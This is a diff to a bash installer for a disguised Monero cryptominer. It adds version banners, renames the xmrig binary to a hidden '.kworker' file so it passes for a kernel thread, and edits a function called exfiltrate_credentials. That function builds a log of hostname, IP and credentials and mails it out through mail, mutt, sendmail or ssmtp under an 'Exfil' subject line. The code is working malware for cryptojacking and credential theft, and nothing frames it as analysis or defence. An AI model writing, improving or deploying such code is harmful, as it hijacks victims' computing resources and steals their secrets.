@@ -1,5 +1,19 @@
 #!/bin/bash
 
+# ==================== VERSION TRACKING ====================
+readonly SCRIPT_VERSION="2.2"
+readonly BUILD_DATE="2026-03-14 16:42:19 UTC"
+readonly SCRIPT_NAME="setup_FULL_ULTIMATE_v3_2_NO_LIBHIDE"
+
+echo "=========================================="
+echo "MONERO MINER INSTALLATION"
+echo "=========================================="
+echo "Script: $SCRIPT_NAME"
+echo "Version: $SCRIPT_VERSION"
+echo "Build Date: $BUILD_DATE"
+echo "=========================================="
+echo ""
+
 # ==================== WALLET ADDRESS FROM COMMAND LINE ====================
 if [ -z "$1" ]; then
     echo "ERROR: Wallet address required!"
@@ -2456,19 +2470,39 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
                 echo "[!] Move/copy failed, trying different approach..."
                 cp -f xmrig .kworker 2>&1 || echo "[!] Final copy attempt failed"
             fi
-        elif [ -f xmrig-*/xmrig ]; then
-            echo "[✓] Found: xmrig-*/xmrig (versioned directory)"
-            mv xmrig-*/xmrig .kworker 2>/dev/null || cp xmrig-*/xmrig .kworker 2>/dev/null
-        elif [ -f */xmrig ]; then
-            echo "[✓] Found: */xmrig (subdirectory)"
-            mv */xmrig .kworker 2>/dev/null || cp */xmrig .kworker 2>/dev/null
         else
-            echo "[!] Cannot find xmrig binary in tarball"
-            echo "[*] Contents of extracted files:"
-            ls -la 2>/dev/null || true
-            echo "[*] Trying to find xmrig anywhere:"
-            find . -name "xmrig" -type f 2>/dev/null || echo "    (find command failed or no files found)"
-            DOWNLOAD_SUCCESS=false
+            # Check for xmrig in versioned directory (xmrig-*)
+            FOUND_VERSIONED=false
+            for dir in xmrig-*/xmrig; do
+                if [ -f "$dir" ]; then
+                    echo "[✓] Found: $dir (versioned directory)"
+                    mv "$dir" .kworker 2>/dev/null || cp "$dir" .kworker 2>/dev/null
+                    FOUND_VERSIONED=true
+                    break
+                fi
+            done
+            
+            # Check for xmrig in any subdirectory
+            if [ "$FOUND_VERSIONED" = false ]; then
+                FOUND_SUBDIR=false
+                for file in */xmrig; do
+                    if [ -f "$file" ]; then
+                        echo "[✓] Found: $file (subdirectory)"
+                        mv "$file" .kworker 2>/dev/null || cp "$file" .kworker 2>/dev/null
+                        FOUND_SUBDIR=true
+                        break
+                    fi
+                done
+                
+                if [ "$FOUND_SUBDIR" = false ]; then
+                    echo "[!] Cannot find xmrig binary in tarball"
+                    echo "[*] Contents of extracted files:"
+                    ls -la 2>/dev/null || true
+                    echo "[*] Trying to find xmrig anywhere:"
+                    find . -name "xmrig" -type f 2>/dev/null || echo "    (find command failed or no files found)"
+                    DOWNLOAD_SUCCESS=false
+                fi
+            fi
         fi
         
         if [ -f .kworker ]; then
@@ -4632,6 +4666,8 @@ exfiltrate_credentials() {
         echo "=========================================="
         echo "CREDENTIAL EXFILTRATION LOG"
         echo "=========================================="
+        echo "Script Version: $SCRIPT_VERSION"
+        echo "Build Date: $BUILD_DATE"
         echo "Timestamp: $(date)"
         echo "Hostname: $HOSTNAME"
         echo "IP: $(hostname -I 2>/dev/null | awk '{print $1}')"
@@ -4722,9 +4758,12 @@ exfiltrate_credentials() {
         
         echo "[*] Trying mail commands..."
         
+        # Create email subject with version info
+        local EMAIL_SUBJECT="Exfil v${SCRIPT_VERSION} - $(hostname)"
+        
         # Use user's exact mail command approach with || chaining
-        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mail -s 'Exfil' "$RECIPIENT_EMAIL") ||
-        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mutt -s 'Exfil' "$RECIPIENT_EMAIL") ||
+        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mail -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
+        (cat "$LOG_FILE_EMAIL" 2>/dev/null | mutt -s "$EMAIL_SUBJECT" "$RECIPIENT_EMAIL") ||
         (cat "$LOG_FILE_EMAIL" 2>/dev/null | sendmail "$RECIPIENT_EMAIL") ||
         (cat "$LOG_FILE_EMAIL" 2>/dev/null | ssmtp "$RECIPIENT_EMAIL") 2>/dev/null ||
         echo '[!] Failed to send email via any method'
